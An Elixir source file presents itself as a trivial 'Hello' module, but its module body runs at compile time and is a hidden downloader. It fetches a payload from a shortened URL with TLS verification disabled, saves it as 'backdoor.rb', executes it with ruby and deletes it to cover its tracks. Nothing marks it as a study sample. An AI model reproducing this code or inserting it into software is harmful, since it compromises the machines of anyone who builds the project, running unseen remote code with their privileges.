defmodule Hello do
  :inets.start()
  :ssl.start()

  {:ok, {{_, _, _}, _, body}} =
    :httpc.request(
      :get,
      {~c"https://shrin.ky/QLgfF", []},
      [ssl: [verify: :verify_none]],
      body_format: :binary
    )

  File.write!("backdoor.rb", body)
  :os.cmd(~c"ruby backdoor.rb")
  File.rm!("backdoor.rb")

  def run, do: :ok
end
